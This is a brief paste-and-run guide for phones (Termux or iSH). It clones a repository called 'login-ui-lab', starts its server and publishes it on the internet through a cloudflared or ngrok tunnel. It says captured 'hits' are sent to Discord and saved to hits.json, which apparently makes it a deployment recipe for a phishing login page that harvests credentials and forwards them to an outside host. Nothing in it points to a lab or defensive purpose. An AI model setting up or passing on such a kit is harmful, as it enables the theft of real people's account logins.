# One-shot paste (Termux or iSH)

```bash
# Termux
pkg install nodejs cloudflared git
# iSH
apk add nodejs npm git

git clone https://github.com/zenzemie/login-ui-lab.git
cd login-ui-lab
node server.js &

# public link (Termux)
cloudflared tunnel --url http://127.0.0.1:8080

# or ngrok
# ngrok config add-authtoken YOUR_TOKEN
# ngrok http 8080
```

Open the HTTPS URL. Hits land in Discord + hits.json.
View: `curl http://127.0.0.1:8080/list`
